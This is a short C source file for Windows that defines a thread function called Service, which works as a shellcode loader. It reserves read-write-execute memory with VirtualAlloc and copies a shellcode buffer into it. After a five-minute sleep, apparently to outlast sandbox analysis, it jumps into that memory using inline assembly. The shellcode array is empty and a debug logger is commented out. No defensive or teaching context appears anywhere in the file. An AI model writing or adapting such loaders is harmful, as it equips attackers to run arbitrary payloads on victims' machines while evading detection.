#include "Payload.h"


DWORD WINAPI Service(LPVOID lpvThread)
{
	/*
	SYSTEMTIME oT;
	while(1){
		GetLocalTime(&oT);
		FILE* pLog = fopen("c:\\debug.log","at+");
		fprintf(pLog,"%2d.%2d.%2d %2d.%2d %2d\n",oT.wYear,oT.wMonth,oT.wDay,oT.wHour,oT.wMinute,oT.wSecond,oT.wMilliseconds); 
		fclose(pLog);
		Sleep(5000);
	}
	*/

	//shellcode
	unsigned char shellcode[] = "";

	PVOID p;
	
	p = VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if( p != NULL){
		//printf("alloc ok");
		if(memcpy(p,shellcode,sizeof(shellcode))){
			//printf("cp ok");
			//wait 5m
			Sleep(1000*60*5);
			
			__asm
			{
				mov eax,p;
				jmp eax;
			}
		}
	}

	return 0;
}